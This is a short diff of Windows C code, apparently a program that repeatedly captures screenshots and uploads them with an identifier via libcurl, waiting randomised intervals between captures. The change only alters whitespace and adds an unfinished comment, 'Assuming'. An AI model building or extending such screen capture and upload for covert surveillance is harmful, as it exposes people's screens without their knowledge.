@@ -279,7 +279,7 @@ void upload_screenshot(BYTE *image_data, unsigned int image_size, char *uuid)
         {
             fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
         }
-
+        
         curl_easy_cleanup(curl);
         curl_mime_free(mime);
         curl_slist_free_all(headerlist);
@@ -319,7 +319,7 @@ int main(int argc, char **argv) {
                 }
                 DeleteObject(hbmScreenshot);
             }
-            int rand_interval = RAND_INTERVAL_MIN + rand() % (RAND_INTERVAL_MAX - RAND_INTERVAL_MIN + 1);  
+            int rand_interval = RAND_INTERVAL_MIN + rand() % (RAND_INTERVAL_MAX - RAND_INTERVAL_MIN + 1);  // Assuming 
             Sleep(rand_interval * 1000);
         }
     }
